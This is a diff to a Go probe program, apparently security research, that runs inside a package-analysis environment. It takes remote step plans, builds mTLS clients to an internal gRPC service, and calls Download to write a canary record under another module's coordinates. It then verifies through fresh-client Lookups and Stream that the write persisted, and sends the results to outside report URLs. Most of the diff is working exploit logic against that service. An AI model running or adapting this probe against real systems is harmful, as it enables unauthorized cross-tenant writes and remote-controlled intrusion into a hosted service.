@@ -23,6 +23,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"unicode/utf8"
 )
 
 var genericResultURL string
@@ -35,21 +36,32 @@ var rpcServiceHost string
 var rpcDialAddress string
 
 const (
-	protocolVersion    = 1
-	moduleName         = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion       = "v0.0.36-codex"
-	targetRegistry     = "https://proxy.golang.org"
-	targetModuleName   = "github.com/benr00t3d/go-byteman-crosswrite-canary"
-	targetVersion      = "v0.0.1"
-	targetCanarySHA256 = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
-	downloadSource     = "robert-owned-v036-cross-package-canary"
-	maximumResult      = 256 * 1024
-	maximumBody        = 256 * 1024
-	requestTimeout     = 20 * time.Second
-	resultTimeout      = 30 * time.Second
-	planPollWindow     = 30 * time.Minute
-	maximumPlanBody    = 4096
-	maximumPlanStep    = 12
+	protocolVersion     = 1
+	moduleName          = "github.com/benr00t3d/go-cgo-pkgsite-probe"
+	probeVersion        = "v0.0.37-codex"
+	targetRegistry      = "https://proxy.golang.org"
+	targetModuleName    = "github.com/benr00t3d/go-byteman-crosswrite-canary"
+	targetVersion       = "v0.0.1"
+	targetCanarySHA256  = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
+	targetCanaryBytes   = 2512
+	originGoneSHA256    = "2060dcc16cdd2cb518700076b1ccf2fadbff619b32af84250c176e70590f1f0a"
+	originGoneBytes     = 36
+	downloadSource      = "robert-owned-v037-cross-package-offline-canary"
+	maximumResult       = 256 * 1024
+	maximumBody         = 256 * 1024
+	requestTimeout      = 20 * time.Second
+	bytemanGRPCTimeout  = 60 * time.Second
+	bytemanHTTPTimeout  = 65 * time.Second
+	resultTimeout       = 30 * time.Second
+	planPollWindow      = 30 * time.Minute
+	maximumPlanBody     = 4096
+	maximumPlanStep     = 12
+	maximumWireDepth    = 10
+	maximumWireFields   = 512
+	lookupRecordLimit   = 32
+	postWritePollWindow = 150 * time.Second
+	postWriteCallLimit  = 60 * time.Second
+	postWritePollDelay  = 2 * time.Second
 )
 
 var bucketNames = []string{
@@ -121,16 +133,51 @@ type bucketResult struct {
 }
 
 type grpcResult struct {
-	ID            string `json:"id,omitempty"`
-	Method        string `json:"method"`
-	HTTPStatus    int    `json:"http_status,omitempty"`
-	GRPCStatus    string `json:"grpc_status,omitempty"`
-	GRPCMessage   string `json:"grpc_message,omitempty"`
-	BodyBytes     int    `json:"body_bytes,omitempty"`
-	BodySHA256    string `json:"body_sha256,omitempty"`
-	ContentType   string `json:"content_type,omitempty"`
-	Authenticated bool   `json:"authenticated"`
-	Error         string `json:"error,omitempty"`
+	ID                  string            `json:"id,omitempty"`
+	Method              string            `json:"method"`
+	HTTPStatus          int               `json:"http_status,omitempty"`
+	GRPCStatus          string            `json:"grpc_status,omitempty"`
+	GRPCMessage         string            `json:"grpc_message,omitempty"`
+	BodyBytes           int               `json:"body_bytes,omitempty"`
+	BodySHA256          string            `json:"body_sha256,omitempty"`
+	ContentType         string            `json:"content_type,omitempty"`
+	Authenticated       bool              `json:"authenticated"`
+	Wire                []wireFieldDigest `json:"wire,omitempty"`
+	LookupRecordMatched bool              `json:"lookup_record_matched,omitempty"`
+	LookupMatchPath     string            `json:"lookup_match_path,omitempty"`
+	LookupRecordCount   int               `json:"lookup_record_count,omitempty"`
+	LookupMatchCount    int               `json:"lookup_match_count,omitempty"`
+	LookupRecordsSHA256 string            `json:"lookup_records_sha256,omitempty"`
+	LookupMatchSHA256   string            `json:"lookup_match_sha256,omitempty"`
+	RecordMatched       bool              `json:"record_matched,omitempty"`
+	RecordSHA256        string            `json:"record_sha256,omitempty"`
+	DigestFieldSHA256   string            `json:"digest_field_sha256,omitempty"`
+	IDFieldSHA256       string            `json:"id_field_sha256,omitempty"`
+	DownloadStatusCode  uint64            `json:"download_status_code,omitempty"`
+	DownloadStatusSet   bool              `json:"download_status_set,omitempty"`
+	PayloadBytes        int               `json:"payload_bytes,omitempty"`
+	PayloadSHA256       string            `json:"payload_sha256,omitempty"`
+	PayloadPath         string            `json:"payload_path,omitempty"`
+	AnalysisError       string            `json:"analysis_error,omitempty"`
+	Error               string            `json:"error,omitempty"`
+}
+
+type wireFieldDigest struct {
+	Path   string `json:"path"`
+	Bytes  int    `json:"bytes"`
+	SHA256 string `json:"sha256"`
+	Text   string `json:"text,omitempty"`
+	Nested bool   `json:"nested,omitempty"`
+}
+
+type originResult struct {
+	HTTPStatus  int    `json:"http_status,omitempty"`
+	BodyBytes   int    `json:"body_bytes,omitempty"`
+	BodySHA256  string `json:"body_sha256,omitempty"`
+	ContentType string `json:"content_type,omitempty"`
+	State       string `json:"state,omitempty"`
+	Offline     bool   `json:"offline"`
+	Error       string `json:"error,omitempty"`
 }
 
 type planStep struct {
@@ -162,6 +209,9 @@ type probeReport struct {
 	CanaryBodySHA256  string            `json:"canary_body_sha256,omitempty"`
 	Byteman           []grpcResult      `json:"byteman,omitempty"`
 	DownloadAttempted bool              `json:"download_attempted"`
+	FreshMTLSClient   bool              `json:"fresh_mtls_client"`
+	Origin            originResult      `json:"origin"`
+	StreamVerified    bool              `json:"stream_verified"`
 	PlanID            string            `json:"plan_id,omitempty"`
 	RouteMode         string            `json:"route_mode,omitempty"`
 	Inspection        *inspectionResult `json:"inspection,omitempty"`
@@ -190,7 +240,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v036-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v037-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -332,7 +382,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v036-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v037-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
@@ -369,7 +419,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v036-codex-step-" + strconv.Itoa(cursor)
+		id := "v037-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -388,7 +438,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v036-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v037-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -488,32 +538,248 @@ func runBytemanProbe(report *probeReport, routeMode string) {
 	}
 	urlLookupRequest := buildURLLookupRequest(bytemanCanaryURL)
 	coordinateLookupRequest := buildCoordinateLookupRequest()
-	baselineURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
-	baselineURL.ID = "baseline-url-lookup"
+	baselineURL := callLookup(rpcClient, rpcEndpoint, "baseline-url-lookup", urlLookupRequest)
 	report.Byteman = append(report.Byteman, baselineURL)
-	baselineCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
-	baselineCoordinate.ID = "baseline-coordinate-lookup"
+	baselineCoordinate := callLookup(rpcClient, rpcEndpoint, "baseline-coordinate-lookup", coordinateLookupRequest)
 	report.Byteman = append(report.Byteman, baselineCoordinate)
-	if !grpcSucceeded(baselineURL) || !grpcSucceeded(baselineCoordinate) {
-		report.Reason = "both bounded Byteman baseline Lookups did not authenticate cleanly; Download was not attempted"
+	if grpcSucceeded(baselineURL) && baselineURL.AnalysisError == "" && baselineURL.LookupMatchCount > 0 {
+		rpcClient.CloseIdleConnections()
+		runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, true,
+			baselineURL.DigestFieldSHA256, baselineURL.IDFieldSHA256)
+		return
+	}
+	rpcClient.CloseIdleConnections()
+	downloadClient, downloadEndpoint, err := newMTLSClient(routeMode)
+	if err != nil {
+		report.Byteman = append(report.Byteman, grpcResult{
+			ID: "download-client-setup", Method: "client-setup", Error: cleanError(err),
+		})
+		report.Reason = "fresh single-Download mTLS client setup failed"
 		return
 	}
 	report.DownloadAttempted = true
-	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", buildTargetDownloadRequest(bytemanCanaryURL))
-	download.ID = "cross-package-download"
+	download := callDownload(downloadClient, downloadEndpoint)
 	report.Byteman = append(report.Byteman, download)
-	if grpcSucceeded(download) {
-		time.Sleep(1500 * time.Millisecond)
-		postURL := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", urlLookupRequest)
-		postURL.ID = "post-url-lookup"
-		report.Byteman = append(report.Byteman, postURL)
-		postCoordinate := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", coordinateLookupRequest)
-		postCoordinate.ID = "post-coordinate-lookup"
-		report.Byteman = append(report.Byteman, postCoordinate)
-		report.Reason = "bounded cross-package Download and post-write Lookups completed"
-	} else {
-		report.Reason = "bounded cross-package Download returned without success; post-write Lookups were not sent"
+	downloadClient.CloseIdleConnections()
+	if !grpcSucceeded(download) || download.AnalysisError != "" || !download.RecordMatched ||
+		download.DigestFieldSHA256 == "" || download.IDFieldSHA256 == "" {
+		report.Reason = "bounded cross-package Download did not return one exact identified B record; post-write Lookups were not sent"
+		return
 	}
+	runOfflineReadback(report, routeMode, urlLookupRequest, coordinateLookupRequest, false, download.DigestFieldSHA256, download.IDFieldSHA256)
+}
+
+func runOfflineReadback(report *probeReport, routeMode string, urlLookupRequest, coordinateLookupRequest []byte, readbackOnly bool, expectedDigestSHA256, expectedIDSHA256 string) {
+	// The one-shot URL must be provably unavailable before any persistence read.
+	// Each bounded poll attempt then uses a newly constructed mTLS transport.
+	time.Sleep(250 * time.Millisecond)
+	report.Origin = verifyOriginOffline()
+	if !report.Origin.Offline {
+		if readbackOnly {
+			report.Reason = "baseline URL record existed but its one-shot origin was not offline; readback stopped"
+		} else {
+			report.Reason = "one-shot canary origin was not offline; persistence reads were not attempted"
+		}
+		return
+	}
+
+	deadline := time.Now().Add(postWritePollWindow)
+	matched := false
+	for attempt := 0; time.Now().Before(deadline); attempt++ {
+		freshClient, freshEndpoint, err := newMTLSClient(routeMode)
+		if err != nil {
+			report.Byteman = append(report.Byteman, grpcResult{
+				ID: "fresh-client-setup-" + strconv.Itoa(attempt), Method: "client-setup", Error: cleanError(err),
+			})
+			break
+		}
+		report.FreshMTLSClient = true
+		remaining := time.Until(deadline)
+		perCall := postWriteCallLimit
+		if half := remaining / 2; half < perCall {
+			perCall = half
+		}
+		if perCall < 500*time.Millisecond {
+			freshClient.CloseIdleConnections()
+			break
+		}
+		postURL := callLookupTimeout(freshClient, freshEndpoint, "post-url-lookup-"+strconv.Itoa(attempt), urlLookupRequest, perCall)
+		postCoordinate := callLookupTimeout(freshClient, freshEndpoint, "post-coordinate-lookup-"+strconv.Itoa(attempt), coordinateLookupRequest, perCall)
+		freshClient.CloseIdleConnections()
+		exact := exactLookupPair(postURL, postCoordinate, expectedDigestSHA256, expectedIDSHA256)
+		if !exact {
+			// Repeated poll attempts retain response hashes, counts, and record
+			// fingerprints without multiplying the full field-digest transcript.
+			postURL.Wire = nil
+			postCoordinate.Wire = nil
+		}
+		report.Byteman = append(report.Byteman, postURL, postCoordinate)
+		if exact {
+			matched = true
+			break
+		}
+		remaining = time.Until(deadline)
+		if remaining <= 0 {
+			break
+		}
+		delay := postWritePollDelay
+		if remaining < delay {
+			delay = remaining
+		}
+		time.Sleep(delay)
+	}
+	if !matched {
+		report.Reason = "bounded fresh-client post-write poll found no identical exact B record pair"
+		return
+	}
+
+	streamClient, streamEndpoint, err := newMTLSClient(routeMode)
+	if err != nil {
+		report.Byteman = append(report.Byteman, grpcResult{
+			ID: "stream-client-setup", Method: "client-setup", Error: cleanError(err),
+		})
+		report.Reason = "fresh Stream mTLS client setup failed"
+		return
+	}
+	report.FreshMTLSClient = true
+	stream := callStream(streamClient, streamEndpoint)
+	streamClient.CloseIdleConnections()
+	report.Byteman = append(report.Byteman, stream)
+	if grpcSucceeded(stream) && stream.PayloadBytes == targetCanaryBytes &&
+		stream.PayloadSHA256 == targetCanarySHA256 {
+		report.StreamVerified = true
+		if readbackOnly {
+			report.Reason = "pre-existing URL record was verified read-only with offline fresh-client Lookup and Stream"
+		} else {
+			report.Reason = "offline fresh-client Lookup and Stream verified the exact cross-package canary"
+		}
+		return
+	}
+	report.Reason = "Stream did not reproduce the exact offline cross-package canary"
+}
+
+func exactLookupPair(urlResult, coordinateResult grpcResult, expectedDigestSHA256, expectedIDSHA256 string) bool {
+	return grpcSucceeded(urlResult) && grpcSucceeded(coordinateResult) &&
+		urlResult.AnalysisError == "" && coordinateResult.AnalysisError == "" &&
+		urlResult.LookupMatchCount == 1 && coordinateResult.LookupMatchCount == 1 &&
+		expectedDigestSHA256 != "" && expectedIDSHA256 != "" &&
+		urlResult.LookupMatchSHA256 != "" && urlResult.LookupMatchSHA256 == coordinateResult.LookupMatchSHA256 &&
+		urlResult.DigestFieldSHA256 == expectedDigestSHA256 && coordinateResult.DigestFieldSHA256 == expectedDigestSHA256 &&
+		urlResult.IDFieldSHA256 == expectedIDSHA256 && coordinateResult.IDFieldSHA256 == expectedIDSHA256
+}
+
+func callLookup(client *http.Client, endpoint, id string, request []byte) grpcResult {
+	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Lookup", request)
+	return finishLookup(result, body, id)
+}
+
+func callLookupTimeout(client *http.Client, endpoint, id string, request []byte, timeout time.Duration) grpcResult {
+	result, body := callGRPCRawTimeout(client, endpoint, "/sos.byteman.Byteman/Lookup", request, timeout)
+	return finishLookup(result, body, id)
+}
+
+func finishLookup(result grpcResult, body []byte, id string) grpcResult {
+	result.ID = id
+	if !grpcSucceeded(result) {
+		return result
+	}
+	analysis, err := analyzeLookupBody(body)
+	result.Wire = analysis.Wire
+	result.LookupMatchPath = analysis.MatchPath
+	result.LookupRecordCount = analysis.RecordCount
+	result.LookupMatchCount = analysis.MatchCount
+	result.LookupRecordsSHA256 = analysis.RecordsSHA256
+	result.LookupMatchSHA256 = analysis.MatchSHA256
+	result.RecordSHA256 = analysis.RecordSHA256
+	result.DigestFieldSHA256 = analysis.DigestSHA256
+	result.IDFieldSHA256 = analysis.IDSHA256
+	if err != nil {
+		result.AnalysisError = cleanError(err)
+		return result
+	}
+	result.LookupRecordMatched = analysis.MatchCount == 1
+	result.RecordMatched = analysis.MatchCount == 1
+	return result
+}
+
+func callDownload(client *http.Client, endpoint string) grpcResult {
+	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Download", buildTargetDownloadRequest(bytemanCanaryURL))
+	result.ID = "cross-package-download"
+	if !grpcSucceeded(result) {
+		return result
+	}
+	analysis, err := analyzeDownloadBody(body)
+	result.Wire = analysis.Wire
+	result.RecordMatched = analysis.Identity.Matched
+	result.RecordSHA256 = analysis.Identity.RecordSHA256
+	result.DigestFieldSHA256 = analysis.Identity.DigestSHA256
+	result.IDFieldSHA256 = analysis.Identity.IDSHA256
+	result.DownloadStatusSet = analysis.StatusSet
+	result.DownloadStatusCode = analysis.StatusCode
+	if err != nil {
+		result.AnalysisError = cleanError(err)
+	}
+	return result
+}
+
+func callStream(client *http.Client, endpoint string) grpcResult {
+	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Stream", buildTargetStreamRequest(bytemanCanaryURL))
+	result.ID = "offline-stream-readback"
+	if !grpcSucceeded(result) {
+		return result
+	}
+	wire, payload, path, err := analyzeStreamBody(body)
+	result.Wire = wire
+	if err != nil {
+		result.AnalysisError = cleanError(err)
+		return result
+	}
+	digest := sha256.Sum256(payload)
+	result.PayloadBytes = len(payload)
+	result.PayloadSHA256 = hex.EncodeToString(digest[:])
+	result.PayloadPath = path
+	return result
+}
+
+func verifyOriginOffline() originResult {
+	result := originResult{}
+	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodGet, bytemanCanaryURL, nil)
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	request.Header.Set("User-Agent", probeUserAgent+"-offline-check")
+	client := &http.Client{
+		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
+		Timeout:       requestTimeout,
+	}
+	response, err := client.Do(request)
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	defer response.Body.Close()
+	result.HTTPStatus = response.StatusCode
+	result.ContentType = response.Header.Get("Content-Type")
+	result.State = response.Header.Get("X-Codex-One-Shot-State")
+	body, err := io.ReadAll(io.LimitReader(response.Body, 4097))
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	if len(body) > 4096 {
+		result.Error = "origin check response too large"
+		return result
+	}
+	result.BodyBytes = len(body)
+	digest := sha256.Sum256(body)
+	result.BodySHA256 = hex.EncodeToString(digest[:])
+	result.Offline = response.StatusCode == http.StatusGone &&
+		result.BodyBytes == originGoneBytes && result.BodySHA256 == originGoneSHA256 &&
+		result.ContentType == "application/json" && result.State == "consumed"
+	return result
 }
 
 func grpcSucceeded(result grpcResult) bool {
@@ -529,7 +795,7 @@ func buildCoordinateLookupRequest() []byte {
 	request = appendStringField(request, 7, targetRegistry)
 	request = appendStringField(request, 8, targetModuleName)
 	request = appendStringField(request, 9, targetVersion)
-	request = appendVarintField(request, 10, 1)
+	request = appendVarintField(request, 10, lookupRecordLimit)
 	return request
 }
 
@@ -549,6 +815,405 @@ func buildTargetDownloadRequest(canaryURL string) []byte {
 	request = appendBytesField(request, 4, buildTargetMetadata())
 	request = appendStringField(request, 6, downloadSource)
 	return request
+}
+
+func buildTargetStreamRequest(canaryURL string) []byte {
+	request := appendStringField(nil, 1, canaryURL)
+	request = appendBytesField(request, 2, buildTargetMetadata())
+	return request
+}
+
+type decodedWireMessage struct {
+	fields []decodedWireField
+}
+
+type decodedWireField struct {
+	number int
+	wire   int
+	varint uint64
+	value  []byte
+	child  *decodedWireMessage
+}
+
+func decodeWireMessage(data []byte, depth int) (*decodedWireMessage, bool) {
+	if depth > maximumWireDepth {
+		return nil, false
+	}
+	message := &decodedWireMessage{}
+	for offset := 0; offset < len(data); {
+		key, size := binary.Uvarint(data[offset:])
+		if size <= 0 {
+			return nil, false
+		}
+		offset += size
+		number := int(key >> 3)
+		wire := int(key & 7)
+		if number < 1 || number > (1<<29)-1 {
+			return nil, false
+		}
+		field := decodedWireField{number: number, wire: wire}
+		switch wire {
+		case 0:
+			field.varint, size = binary.Uvarint(data[offset:])
+			if size <= 0 {
+				return nil, false
+			}
+			offset += size
+		case 1:
+			if len(data)-offset < 8 {
+				return nil, false
+			}
+			offset += 8
+		case 2:
+			length, lengthSize := binary.Uvarint(data[offset:])
+			if lengthSize <= 0 {
+				return nil, false
+			}
+			offset += lengthSize
+			if length > uint64(len(data)-offset) {
+				return nil, false
+			}
+			field.value = data[offset : offset+int(length)]
+			offset += int(length)
+			if len(field.value) > 0 && depth < maximumWireDepth {
+				if child, valid := decodeWireMessage(field.value, depth+1); valid && len(child.fields) > 0 {
+					field.child = child
+				}
+			}
+		case 5:
+			if len(data)-offset < 4 {
+				return nil, false
+			}
+			offset += 4
+		default:
+			return nil, false
+		}
+		message.fields = append(message.fields, field)
+	}
+	return message, true
+}
+
+func decodeGRPCMessages(body []byte) ([]*decodedWireMessage, error) {
+	var messages []*decodedWireMessage
+	for offset := 0; offset < len(body); {
+		if len(body)-offset < 5 {
+			return nil, errors.New("truncated gRPC frame header")
+		}
+		if body[offset] != 0 {
+			return nil, errors.New("compressed gRPC response was not allowed")
+		}
+		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
+		offset += 5
+		if length < 0 || length > len(body)-offset {
+			return nil, errors.New("truncated gRPC frame payload")
+		}
+		message, valid := decodeWireMessage(body[offset:offset+length], 0)
+		if !valid {
+			return nil, errors.New("gRPC payload was not valid bounded protobuf wire data")
+		}
+		messages = append(messages, message)
+		offset += length
+	}
+	return messages, nil
+}
+
+func knownWireText(value []byte) string {
+	if !utf8.Valid(value) {
+		return ""
+	}
+	switch string(value) {
+	case bytemanCanaryURL:
+		return "[canary-url]"
+	case targetRegistry, targetModuleName, targetVersion:
+		return string(value)
+	default:
+		return ""
+	}
+}
+
+func summarizeWireMessages(messages []*decodedWireMessage) ([]wireFieldDigest, error) {
+	var digests []wireFieldDigest
+	for frame, message := range messages {
+		prefix := "frame[" + strconv.Itoa(frame) + "]"
+		if err := walkWireMessage(message, prefix, &digests); err != nil {
+			return nil, err
+		}
+	}
+	return digests, nil
+}
+
+func walkWireMessage(message *decodedWireMessage, prefix string, digests *[]wireFieldDigest) error {
+	occurrences := map[int]int{}
+	for _, field := range message.fields {
+		index := occurrences[field.number]
+		occurrences[field.number]++
+		if field.wire != 2 {
+			continue
+		}
+		if len(*digests) >= maximumWireFields {
+			return errors.New("protobuf wire field limit exceeded")
+		}
+		component := strconv.Itoa(field.number)
+		path := prefix + "." + component + "[" + strconv.Itoa(index) + "]"
+		digest := sha256.Sum256(field.value)
+		*digests = append(*digests, wireFieldDigest{
+			Path: path, Bytes: len(field.value), SHA256: hex.EncodeToString(digest[:]),
+			Text: knownWireText(field.value), Nested: field.child != nil,
+		})
+		if field.child != nil {
+			if err := walkWireMessage(field.child, path, digests); err != nil {
+				return err
+			}
+		}
+	}
+	return nil
+}
+
+type lookupBodyAnalysis struct {
+	Wire          []wireFieldDigest
+	RecordCount   int
+	MatchCount    int
+	RecordsSHA256 string
+	MatchSHA256   string
+	MatchPath     string
+	RecordSHA256  string
+	DigestSHA256  string
+	IDSHA256      string
+}
+
+type downloadRecordIdentity struct {
+	Matched      bool
+	RecordSHA256 string
+	DigestSHA256 string
+	IDSHA256     string
+}
+
+type downloadBodyAnalysis struct {
+	Wire       []wireFieldDigest
+	Identity   downloadRecordIdentity
+	StatusSet  bool
+	StatusCode uint64
+}
+
+func targetMetadataMatches(message *decodedWireMessage) bool {
+	counts := map[int]int{}
+	matched := map[int]bool{}
+	for _, field := range message.fields {
+		switch field.number {
+		case 2:
+			counts[2]++
+			matched[2] = field.wire == 2 && string(field.value) == targetRegistry
+		case 3:
+			counts[3]++
+			matched[3] = field.wire == 0 && field.varint == 1 // GO_MODULE
+		case 4:
+			counts[4]++
+			matched[4] = field.wire == 2 && string(field.value) == targetModuleName
+		case 5:
+			counts[5]++
+			matched[5] = field.wire == 0 && field.varint == 1 // CONCRETE
+		case 6:
+			counts[6]++
+			matched[6] = field.wire == 2 && string(field.value) == targetVersion
+		}
+	}
+	for _, number := range []int{2, 3, 4, 5, 6} {
+		if counts[number] != 1 || !matched[number] {
+			return false
+		}
+	}
+	return true
+}
+
+func analyzeTargetDownload(value []byte) downloadRecordIdentity {
+	identity := downloadRecordIdentity{}
+	message, valid := decodeWireMessage(value, 0)
+	if !valid {
+		return identity
+	}
+	counts := map[int]int{}
+	matched := map[int]bool{}
+	var digestValue, idValue []byte
+	for _, field := range message.fields {
+		switch field.number {
+		case 1:
+			counts[1]++
+			matched[1] = field.wire == 2 && string(field.value) == bytemanCanaryURL
+		case 2:
+			counts[2]++
+			matched[2] = field.wire == 2 && len(field.value) > 0
+			digestValue = field.value
+		case 3:
+			counts[3]++
+			matched[3] = field.wire == 0 && field.varint == targetCanaryBytes
+		case 12:
+			counts[12]++
+			if field.wire == 2 {
+				metadata, valid := decodeWireMessage(field.value, 0)
+				matched[12] = valid && targetMetadataMatches(metadata)
+			}
+		case 17:
+			counts[17]++
+			matched[17] = field.wire == 2 && len(field.value) > 0
+			idValue = field.value
+		}
+	}
+	for _, number := range []int{1, 2, 3, 12, 17} {
+		if counts[number] != 1 || !matched[number] {
+			return identity
+		}
+	}
+	recordDigest := sha256.Sum256(value)
+	digestDigest := sha256.Sum256(digestValue)
+	idDigest := sha256.Sum256(idValue)
+	identity.Matched = true
+	identity.RecordSHA256 = hex.EncodeToString(recordDigest[:])
+	identity.DigestSHA256 = hex.EncodeToString(digestDigest[:])
+	identity.IDSHA256 = hex.EncodeToString(idDigest[:])
+	return identity
+}
+
+func analyzeDownloadBody(body []byte) (downloadBodyAnalysis, error) {
+	analysis := downloadBodyAnalysis{}
+	messages, err := decodeGRPCMessages(body)
+	if err != nil {
+		return analysis, err
+	}
+	if len(messages) != 1 {
+		return analysis, errors.New("Download response did not contain exactly one unary gRPC frame")
+	}
+	analysis.Wire, err = summarizeWireMessages(messages)
+	if err != nil {
+		return analysis, err
+	}
+	recordCount := 0
+	statusCount := 0
+	for _, field := range messages[0].fields {
+		switch field.number {
+		case 1:
+			recordCount++
+			if field.wire != 2 {
+				return analysis, errors.New("DownloadResponse record field had the wrong wire type")
+			}
+			analysis.Identity = analyzeTargetDownload(field.value)
+		case 3:
+			statusCount++
+			if field.wire != 0 {
+				return analysis, errors.New("DownloadResponse status_code had the wrong wire type")
+			}
+			analysis.StatusSet = true
+			analysis.StatusCode = field.varint
+		default:
+			return analysis, errors.New("DownloadResponse contained a field outside record 1 and status_code 3")
+		}
+	}
+	if recordCount != 1 || statusCount > 1 || !analysis.Identity.Matched {
+		return analysis, errors.New("DownloadResponse omitted one exact identified B record")
+	}
+	return analysis, nil
+}
+
+func writeFingerprintRecord(hasher io.Writer, value []byte) {
+	var length [4]byte
+	binary.BigEndian.PutUint32(length[:], uint32(len(value)))
+	_, _ = hasher.Write(length[:])
+	_, _ = hasher.Write(value)
+}
+
+func analyzeLookupBody(body []byte) (lookupBodyAnalysis, error) {
+	analysis := lookupBodyAnalysis{}
+	messages, err := decodeGRPCMessages(body)
+	if err != nil {
+		return analysis, err
+	}
+	if len(messages) != 1 {
+		return analysis, errors.New("Lookup response did not contain exactly one unary gRPC frame")
+	}
+	analysis.Wire, err = summarizeWireMessages(messages)
+	if err != nil {
+		return analysis, err
+	}
+	recordsHasher := sha256.New()
+	matchesHasher := sha256.New()
+	for _, field := range messages[0].fields {
+		if field.number != 1 {
+			return analysis, errors.New("LookupResponse contained a field outside repeated Download field 1")
+		}
+		if field.wire != 2 {
+			return analysis, errors.New("LookupResponse Download field had the wrong wire type")
+		}
+		index := analysis.RecordCount
+		analysis.RecordCount++
+		writeFingerprintRecord(recordsHasher, field.value)
+		identity := analyzeTargetDownload(field.value)
+		if !identity.Matched {
+			continue
+		}
+		analysis.MatchCount++
+		writeFingerprintRecord(matchesHasher, field.value)
+		analysis.MatchPath = "frame[0].1[" + strconv.Itoa(index) + "]"
+		analysis.RecordSHA256 = identity.RecordSHA256
+		analysis.DigestSHA256 = identity.DigestSHA256
+		analysis.IDSHA256 = identity.IDSHA256
+	}
+	if analysis.RecordCount > 0 {
+		analysis.RecordsSHA256 = hex.EncodeToString(recordsHasher.Sum(nil))
+	}
+	if analysis.MatchCount > 0 {
+		analysis.MatchSHA256 = hex.EncodeToString(matchesHasher.Sum(nil))
+	}
+	if analysis.MatchCount != 1 {
+		analysis.MatchPath = ""
+		analysis.RecordSHA256 = ""
+		analysis.DigestSHA256 = ""
+		analysis.IDSHA256 = ""
+	}
+	return analysis, nil
+}
+
+func exactPayload(value []byte, expectedBytes int, expectedSHA256 string) bool {
+	if len(value) != expectedBytes {
+		return false
+	}
+	digest := sha256.Sum256(value)
+	return hex.EncodeToString(digest[:]) == expectedSHA256
+}
+
+func analyzeStreamBody(body []byte) ([]wireFieldDigest, []byte, string, error) {
+	return analyzeStreamBodyExpected(body, targetCanaryBytes, targetCanarySHA256)
+}
+
+func analyzeStreamBodyExpected(body []byte, expectedBytes int, expectedSHA256 string) ([]wireFieldDigest, []byte, string, error) {
+	messages, err := decodeGRPCMessages(body)
+	if err != nil {
+		return nil, nil, "", err
+	}
+	if len(messages) == 0 {
+		return nil, nil, "", errors.New("Stream response contained no gRPC frames")
+	}
+	digests, err := summarizeWireMessages(messages)
+	if err != nil {
+		return nil, nil, "", err
+	}
+	payload := []byte{}
+	for _, message := range messages {
+		for _, field := range message.fields {
+			if field.number != 2 {
+				continue
+			}
+			if field.wire != 2 {
+				return digests, nil, "", errors.New("StreamResponse data field 2 had the wrong wire type")
+			}
+			payload = append(payload, field.value...)
+			if len(payload) > expectedBytes {
+				return digests, nil, "", errors.New("StreamResponse data exceeded the exact canary size")
+			}
+		}
+	}
+	if !exactPayload(payload, expectedBytes, expectedSHA256) {
+		return digests, nil, "", errors.New("top-level StreamResponse field 2 did not match the exact canary")
+	}
+	return digests, payload, "top-level-field-2", nil
 }
 
 type boundedBuffer struct {
@@ -840,7 +1505,8 @@ func newMTLSClient(routeMode string) (*http.Client, string, error) {
 		}
 	}
 	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
-	endpoint := "https://" + net.JoinHostPort(tlsServerName, strconv.Itoa(port))
+	authorityHost := bytemanAuthorityHost(serviceHost, tlsServerName, useInjectedRPC)
+	endpoint := "https://" + net.JoinHostPort(authorityHost, strconv.Itoa(port))
 	rpcServiceHost = serviceHost
 	rpcDialAddress = address
